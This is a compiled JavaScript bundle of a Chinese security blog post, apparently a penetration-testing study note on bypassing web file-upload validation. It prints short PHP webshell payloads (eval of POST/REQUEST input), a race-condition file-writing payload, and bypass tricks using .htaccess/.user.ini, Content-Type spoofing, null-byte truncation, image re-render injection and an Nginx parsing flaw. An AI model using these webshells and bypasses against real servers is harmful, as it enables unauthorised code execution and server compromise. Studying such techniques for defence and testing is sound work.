"use strict";(self.webpackChunkblog=self.webpackChunkblog||[]).push([[872],{6262:(i,s)=>{s.A=(i,s)=>{const e=i.__vccOpts||i;for(const[i,a]of s)e[i]=a;return e}},2252:(i,s,e)=>{e.r(s),e.d(s,{comp:()=>h,data:()=>n});var a=e(641);const t={},h=(0,e(6262).A)(t,[["render",function(i,s){return(0,a.uX)(),(0,a.CE)("div",null,[s[0]||(s[0]=(0,a.Fv)('<h1 id="简述" tabindex="-1"><a class="header-anchor" href="#简述"><span>简述</span></a></h1><p>Web 文件上传漏洞指的是 Web 应用程序在处理用户上传文件的过程中，由于对上传文件的类型、大小、内容等方面缺乏严格有效的验证和过滤，导致攻击者能够上传恶意文件到服务器上，并可能进一步执行这些文件，从而对服务器系统和数据造成损害。</p><h2 id="目录" tabindex="-1"><a class="header-anchor" href="#目录"><span>目录</span></a></h2><ul><li>上传.user.ini / .htaccess 配置文件方式绕过验证</li><li>通过抓包更改文件类型绕过验证</li><li>通过更改文件头的方式绕过验证</li><li>黑名单白名单检测机制</li><li>Zero-Zero截断</li><li>条件竞争</li><li>二次渲染</li><li>函数缺陷</li><li>Nginx解析漏洞</li></ul>',4)),(0,a.Q3)(" more "),s[1]||(s[1]=(0,a.Fv)('<p><strong>.user.ini 是用户自定义的php全局配置文件。</strong></p><p><strong>.htaccess 是Apache的配置文件（只能在Apache服务器起作用。）</strong></p><h3 id="htaccess" tabindex="-1"><a class="header-anchor" href="#htaccess"><span>.htaccess</span></a></h3><blockquote><p>.htaccess文件提供了针对每个目录改变配置的方法，即在一个特定的目录中放置一个包含指令的文件，其中的指令作用于此目录及其所有子目录。 在绕过文件上传的限制中，在Apache全局配置文件中httpd.conf有这样一条配置: AddType application/x-httpd-php .php .phtml .php5 .pht .phps <strong><code>.jpg</code></strong></p></blockquote><h3 id="user-ini" tabindex="-1"><a class="header-anchor" href="#user-ini"><span>.user.ini</span></a></h3><blockquote><p>将上传服务器.user.ini写入 <code>auto_prepend_file=Demo.png</code> 在包含的文件Demo.png中写入一句话木马即可。</p></blockquote><h1 id="二-通过抓包更改文件类型绕过验证" tabindex="-1"><a class="header-anchor" href="#二-通过抓包更改文件类型绕过验证"><span>（二）通过抓包更改文件类型绕过验证</span></a></h1><p>抓包找到Content-Type将类型改成图片类型：image/gif</p><div class="language-http line-numbers-mode" data-highlighter="shiki" data-ext="http" data-title="http" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">Content-Type</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">image/gif</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h1 id="三-通过更改文件头的方式绕过验证" tabindex="-1"><a class="header-anchor" href="#三-通过更改文件头的方式绕过验证"><span>（三）通过更改文件头的方式绕过验证</span></a></h1><p>使用编辑器将一句话木马代码开头加上任意图片类型头文件，例如：<code>GIF89a</code></p><div class="language-php line-numbers-mode" data-highlighter="shiki" data-ext="php" data-title="php" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">GIF89a</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;</span><span style="--shiki-light:#383A42;--shiki-dark:#C678DD;">?</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">php</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> eval</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$_POST</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;a&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">]);</span><span style="--shiki-light:#383A42;--shiki-dark:#C678DD;">?</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>与此同时也要通过bp抓包更改Content-Type文件类型。</strong></p><h1 id="四-黑名单白名单检测机制" tabindex="-1"><a class="header-anchor" href="#四-黑名单白名单检测机制"><span>（四）黑名单白名单检测机制</span></a></h1><h3 id="黑名单" tabindex="-1"><a class="header-anchor" href="#黑名单"><span>黑名单</span></a></h3><p>检查机制可能出现以下漏洞：</p><blockquote><ol><li><em>对后缀名的过滤只检测一次</em></li><li><em>未区分大小写进行过滤</em></li><li><em>黑名单中存在文件类型检测不严格</em></li></ol></blockquote><h3 id="白名单" tabindex="-1"><a class="header-anchor" href="#白名单"><span>白名单</span></a></h3><p>。。。</p><h1 id="五-zero-zero截断" tabindex="-1"><a class="header-anchor" href="#五-zero-zero截断"><span>（五）Zero-Zero截断</span></a></h1><p><strong>条件：PHP版本小于5.3.4 &amp;&amp; magic_quotes_gpc = OFF</strong></p><p>使用bp抓包，在POST后面的文件路径中，将文件后缀修改为<code>.php%00</code> （目前几乎很少见到这个php版本了）</p><p><strong>如果路径不在POST后面而在下方某处，需要将%00进行URL解码，才能正常上传。</strong></p><h1 id="六-条件竞争" tabindex="-1"><a class="header-anchor" href="#六-条件竞争"><span>（六）条件竞争</span></a></h1><p><strong>逻辑缺陷 --&gt; 先上传 后判断 再逻辑处理</strong></p><div class="language-php line-numbers-mode" data-highlighter="shiki" data-ext="php" data-title="php" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;</span><span style="--shiki-light:#383A42;--shiki-dark:#C678DD;">?</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">php</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> fputs</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">fopen</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;xiao.php&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;w&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">),</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;&lt;?php eval($_REQUEST[1]);?&gt;&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span><span style="--shiki-light:#383A42;--shiki-dark:#C678DD;">?</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>用bp不断地上传这个文件，浏览器这边不停地按刷新，直到写入代码执行。</p><h1 id="七-二次渲染" tabindex="-1"><a class="header-anchor" href="#七-二次渲染"><span>（七）二次渲染</span></a></h1><p><strong>条件：文件上传漏洞 &amp;&amp; 文件包含漏洞</strong></p><p>将正常图片上传，上传后下载服务器方向你展现的图片（路径信息和文件查看），原图与服务器方渲染后的图放入010十六进制编辑器里做比较，分析哪些内容是被压缩而改变的，哪些内容是不会发生改变的。将一句话木马植入不会发送改变的内容后面再进行上传。上传成功后利用文件包含漏洞显示敏感信息。<code>POST data：pass=phpinfo();</code></p><div class="language-php line-numbers-mode" data-highlighter="shiki" data-ext="php" data-title="php" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;</span><span style="--shiki-light:#383A42;--shiki-dark:#C678DD;">?</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">php</span><span style="--shiki-light:#383A42;--shiki-dark:#C678DD;"> @</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">eval</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$_POST</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;pass&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">));</span><span style="--shiki-light:#383A42;--shiki-dark:#C678DD;">?</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h1 id="八-函数缺陷" tabindex="-1"><a class="header-anchor" href="#八-函数缺陷"><span>（八）函数缺陷</span></a></h1><div class="language-php line-numbers-mode" data-highlighter="shiki" data-ext="php" data-title="php" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">move_uploaded_file</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$temp_file</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> $image_path</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><strong>条件：使用后端代码中出现上述函数&amp;&amp;文件的命名由你自定义。</strong></p><p>上传后缀为JPG的文件，文件内容是一句话木马。如果旁边有文本框让你自定义文件名即可利用此漏洞。</p><p>可以命名为<code>1.php/.</code> 即可绕过限制。 （实际中，几乎没有这种让你自定义文件名的文本框功能）</p><h1 id="九-nginx解析漏洞" tabindex="-1"><a class="header-anchor" href="#九-nginx解析漏洞"><span>（九）Nginx解析漏洞</span></a></h1><p><strong>版本信息：</strong></p><blockquote><ul><li>Nginx 1.x 最新版</li><li>PHP 7.x最新版</li></ul></blockquote><p><em>由此可知，该漏洞与Nginx和PHP版本无关，属于用户配置不当造成的解析漏洞。</em></p><p><strong>利用解析漏洞绕过PHP后缀检测：</strong></p><p>首先上传一个正常的图片文件利用bp抓包Request窗口调至Raw处在文件内容后面添加恶意的php代码。</p><p><img src="/assets/images/2025-02-16/t1.png" alt="1"></p><p>Response窗口获得存放路径，直接在浏览上访问，并在图片路径后面添加任意的带php后缀的文件名，即可完成访问。</p><p><img src="/assets/images/2025-02-16/t2.png" alt="2"></p>',45))])}]]),n=JSON.parse('{"path":"/posts/2025-02-16.html","title":"文件上传","lang":"zh-CN","frontmatter":{"title":"文件上传","cover":null,"icon":"pen-to-square","date":"2025-02-16T00:00:00.000Z","category":["网络安全"],"tag":["Web漏洞","Web安全"],"star":false,"sticky":false,"description":"Web 文件上传漏洞指的是 Web 应用程序在处理用户上传文件的过程中，由于对上传文件的类型、大小、内容等方面缺乏严格有效的验证和过滤，导致攻击者能够上传恶意文件到服务器上，并可能进一步执行这些文件，从而对服务器系统和数据造成损害。 目录 上传.user.ini / .htaccess 配置文件方式绕过验证 通过抓包更改文件类型绕过验证 通过更改文件头...","head":[["meta",{"property":"og:url","content":"https://mister-hope.github.io/posts/2025-02-16.html"}],["meta",{"property":"og:site_name","content":"云晞科技"}],["meta",{"property":"og:title","content":"文件上传"}],["meta",{"property":"og:description","content":"Web 文件上传漏洞指的是 Web 应用程序在处理用户上传文件的过程中，由于对上传文件的类型、大小、内容等方面缺乏严格有效的验证和过滤，导致攻击者能够上传恶意文件到服务器上，并可能进一步执行这些文件，从而对服务器系统和数据造成损害。 目录 上传.user.ini / .htaccess 配置文件方式绕过验证 通过抓包更改文件类型绕过验证 通过更改文件头..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:image","content":"https://mister-hope.github.io/assets/images/2025-02-16/t1.png"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-02-16T15:21:41.000Z"}],["meta",{"property":"article:tag","content":"Web漏洞"}],["meta",{"property":"article:tag","content":"Web安全"}],["meta",{"property":"article:published_time","content":"2025-02-16T00:00:00.000Z"}],["meta",{"property":"article:modified_time","content":"2025-02-16T15:21:41.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"文件上传\\",\\"image\\":[\\"https://mister-hope.github.io/assets/images/2025-02-16/t1.png\\",\\"https://mister-hope.github.io/assets/images/2025-02-16/t2.png\\"],\\"datePublished\\":\\"2025-02-16T00:00:00.000Z\\",\\"dateModified\\":\\"2025-02-16T15:21:41.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"Lucifrix\\",\\"url\\":\\"https://mister-hope.com\\"}]}"]]},"headers":[{"level":2,"title":"目录","slug":"目录","link":"#目录","children":[{"level":3,"title":".htaccess","slug":"htaccess","link":"#htaccess","children":[]},{"level":3,"title":".user.ini","slug":"user-ini","link":"#user-ini","children":[]},{"level":3,"title":"黑名单","slug":"黑名单","link":"#黑名单","children":[]},{"level":3,"title":"白名单","slug":"白名单","link":"#白名单","children":[]}]}],"git":{"createdTime":1739719301000,"updatedTime":1739719301000,"contributors":[{"name":"achenc1013","username":"achenc1013","email":"1013199991@qq.com","commits":1,"url":"https://github.com/achenc1013"}]},"readingTime":{"minutes":3.69,"words":1108},"filePathRelative":"posts/2025-02-16.md","localizedDate":"2025年2月16日","excerpt":"\\n<p>Web 文件上传漏洞指的是 Web 应用程序在处理用户上传文件的过程中，由于对上传文件的类型、大小、内容等方面缺乏严格有效的验证和过滤，导致攻击者能够上传恶意文件到服务器上，并可能进一步执行这些文件，从而对服务器系统和数据造成损害。</p>\\n<h2>目录</h2>\\n<ul>\\n<li>上传.user.ini / .htaccess 配置文件方式绕过验证</li>\\n<li>通过抓包更改文件类型绕过验证</li>\\n<li>通过更改文件头的方式绕过验证</li>\\n<li>黑名单白名单检测机制</li>\\n<li>Zero-Zero截断</li>\\n<li>条件竞争</li>\\n<li>二次渲染</li>\\n<li>函数缺陷</li>\\n<li>Nginx解析漏洞</li>\\n</ul>\\n","autoDesc":true}')}}]);